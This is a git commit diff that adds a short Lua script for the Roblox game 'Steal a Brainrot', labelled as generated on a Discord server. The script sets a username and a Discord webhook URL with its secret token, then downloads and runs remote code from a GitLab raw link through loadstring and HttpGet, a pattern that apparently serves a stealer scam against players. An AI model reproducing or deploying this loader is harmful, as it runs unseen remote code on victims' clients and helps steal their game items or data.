77943c3d4fe3139c1f5dbed29ec990c21afb67a5
malalllbnnz-arch <malalllbnnz@gmail.com>
2026-03-09 20:54:32 +0300

    Update and rename Steal a brainrot accept to Steal a brainrot accept.lua

---
+++ Steal a brainrot accept.lua
@@ -0,0 +1,8 @@
+-- ts file was generated at discord.gg/25ms
+
+local fenv = getfenv()
+
+fenv.Username = 'Sanrekar29'
+fenv.Webhook = 'https://discord.com/api/webhooks/1479035705593172114/NesiZJwEOVOd-uChmIRnEqqZ8AtpiK38SSJvI_81tOku3hODtWmsvolqy9IDii0IK2Vb'
+
+loadstring(game:HttpGet('https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot'))()
